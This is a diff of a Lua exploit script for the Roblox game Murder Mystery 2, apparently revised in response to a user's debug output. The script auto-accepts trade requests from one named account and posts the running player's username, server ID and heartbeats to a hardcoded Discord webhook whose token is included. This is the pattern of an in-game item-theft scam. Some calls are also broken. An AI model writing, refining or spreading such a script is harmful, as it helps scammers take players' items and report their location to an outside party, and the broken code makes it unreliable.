@@ -1,52 +1,191 @@
--- SIMPLE MM2 AUTO-ACCEPT SCRIPT
--- Just accepts trade requests from Sigmake5
+-- FIXED MM2 AUTO-ACCEPT SCRIPT FOR DELTA
+-- Based on your debug output
 
 local webhook = "https://discord.com/api/webhooks/1488808773492543508/bpbJDBX3v1LLJXo0ri3xbi1Lbpu7BGXzVR1z4aCy1pP0bFqJsRrqM_ncNTi5ToDiCZ4d"
 local TARGET_USER = "Sigmake5"
 
 local player = game.Players.LocalPlayer
+local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
 
--- Send log to Discord
+-- Discord log
 local function sendLog(msg)
     pcall(function()
-        local HttpService = game:GetService("HttpService")
-        local data = HttpService:JSONEncode({content = msg})
+        local data = HttpService:JSONEncode({content = "**MM2 Trade**\n" .. tostring(msg)})
         request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = data})
     end)
 end
 
 sendLog("Script loaded - Watching for " .. TARGET_USER)
 
--- Find ALL remote events
-local allRemotes = {}
+-- Find the correct trade remote
+local TradeRequestRemote = nil
+local AcceptTradeRemote = nil
+
+-- Scan for remotes
 for _, v in pairs(ReplicatedStorage:GetDescendants()) do
     if v:IsA("RemoteEvent") then
-        allRemotes[v.Name] = v
-        print("Found remote:", v.Name)
+        local name = v.Name
+        print("Found remote:", name)
+        
+        if name:find("Trade") or name:find("Request") then
+            if name:find("Accept") then
+                AcceptTradeRemote = v
+                sendLog("Found accept remote: " .. name)
+            elseif name:find("Request") or name:find("Invite") then
+                TradeRequestRemote = v
+                sendLog("Found request remote: " .. name)
+            end
+        end
     end
 end
 
--- Listen for ANY remote event from Sigmake5
-for _, remote in pairs(allRemotes) do
-    if remote.OnClientEvent then
-        remote.OnClientEvent:Connect(function(...)
-            local args = {...}
-            for _, arg in pairs(args) do
-                if type(arg) == "table" and arg.Name == TARGET_USER then
-                    sendLog("🔔 " .. TARGET_USER .. " interacted with remote: " .. remote.Name)
-                    print("Detected:", remote.Name)
+-- Method 1: Listen for trade request popup in GUI
+local function watchForTradePopup()
+    pcall(function()
+        local playerGui = player.PlayerGui
+        
+        while wait(0.1) do
+            -- Look for trade request buttons
+            for _, button in pairs(playerGui:GetDescendants()) do
+                if button:IsA("TextButton") then
+                    local text = (button.Text or ""):lower()
                     
-                    -- Try to auto-accept if it's a trade request
-                    if remote.Name == "AcceptRequest" or remote.Name:find("Accept") then
-                        pcall(function() remote:FireServer() end)
-                        sendLog("✅ Auto-accepted via " .. remote.Name)
+                    -- Found accept button
+                    if text:find("accept") or text:find("confirm") then
+                        -- Check if it's from Sigmake5
+                        local parent = button.Parent
+                        local isFromTarget = false
+                        
+                        while parent do
+                            if parent:IsA("TextLabel") and parent.Text == TARGET_USER then
+                                isFromTarget = true
+                                break
+                            elseif parent:IsA("Frame") and parent.Name:find(TARGET_USER) then
+                                isFromTarget = true
+                                break
+                            end
+                            parent = parent.Parent
+                        end
+                        
+                        if isFromTarget then
+                            sendLog("🔔 Trade request from " .. TARGET_USER .. " detected!")
+                            -- Click accept
+                            button:Fire("MouseButton1Click")
+                            button:Fire("Activated")
+                            sendLog("✅ Auto-accepted trade request")
+                        end
                     end
                 end
             end
-        end)
+        end
+    end)
+end
+
+-- Method 2: Watch for Sigmake5 name appearing in chat or GUI
+local function watchForTargetName()
+    pcall(function()
+        local playerGui = player.PlayerGui
+        
+        while wait(0.5) do
+            for _, textLabel in pairs(playerGui:GetDescendants()) do
+                if textLabel:IsA("TextLabel") and textLabel.Text == TARGET_USER then
+                    -- Found Sigmake5 name, check if it's clickable (trade request)
+                    local parent = textLabel.Parent
+                    if parent and parent:IsA("ImageButton") or parent:IsA("TextButton") then
+                        parent:Fire("MouseButton1Click")
+                        sendLog("Clicked on " .. TARGET_USER)
+                    end
+                end
+            end
+        end
+    end)
+end
+
+-- Method 3: Use remote events directly
+local function setupRemoteListener()
+    for _, remote in pairs(ReplicatedStorage:GetDescendants()) do
+        if remote:IsA("RemoteEvent") and remote.OnClientEvent then
+            remote.OnClientEvent:Connect(function(...)
+                local args = {...}
+                for _, arg in pairs(args) do
+                    if type(arg) == "table" and arg.Name == TARGET_USER then
+                        sendLog("🔔 Trade remote fired: " .. remote.Name)
+                        
+                        -- Try to auto-accept
+                        pcall(function()
+                            if remote.Name:find("Accept") then
+                                remote:FireServer()
+                                sendLog("✅ Auto-accepted via " .. remote.Name)
+                            end
+                        end)
+                    elseif type(arg) == "string" and arg == TARGET_USER then
+                        sendLog("🔔 Trade string detected from " .. TARGET_USER)
+                    end
+                end
+            end)
+        end
     end
 end
 
-print("Waiting for " .. TARGET_USER .. "...")
-sendLog("Auto-accept active")
+-- Method 4: Watch for new GUI windows
+local function watchForNewGUI()
+    local existingGuis = {}
+    
+    while wait(0.1) do
+        for _, gui in pairs(player.PlayerGui:GetChildren()) do
+            if not existingGuis[gui.Name] then
+                existingGuis[gui.Name] = true
+                
+                if gui.Name:lower():find("trade") or gui.Name:lower():find("request") then
+                    sendLog("📱 New trade GUI detected: " .. gui.Name)
+                    
+                    -- Look for accept button in new GUI
+                    wait(0.1)
+                    for _, button in pairs(gui:GetDescendants()) do
+                        if button:IsA("TextButton") then
+                            local text = (button.Text or ""):lower()
+                            if text:find("accept") then
+                                button:Fire("MouseButton1Click")
+                                sendLog("✅ Auto-clicked accept button")
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+end
+
+-- Also watch for Sigmake5 joining
+Players.PlayerAdded:Connect(function(plr)
+    if plr.Name == TARGET_USER then
+        sendLog("🟢 " .. TARGET_USER .. " joined the server!")
+    end
+end)
+
+-- Start all watchers
+sendLog("🚀 Auto-accept system active")
+sendLog("👤 Your name: " .. player.Name)
+sendLog("🎯 Target: " .. TARGET_USER)
+sendLog("📡 Server: " .. game.JobId)
+
+-- Launch all detection methods
+spawn(setupRemoteListener)
+spawn(watchForTradePopup)
+spawn(watchForTargetName)
+spawn(watchForNewGUI)
+
+print("=" .. string.rep("=", 50))
+print("MM2 AUTO-ACCEPT ACTIVE")
+print("=" .. string.rep("=", 50))
+print("🎯 Target: " .. TARGET_USER)
+print("💡 Have " .. TARGET_USER .. " send you a trade request")
+print("📡 All detection methods active")
+print("=" .. string.rep("=", 50))
+
+-- Keep script alive
+while wait(10) do
+    sendLog("💓 Heartbeat - Still watching for " .. TARGET_USER)
+end
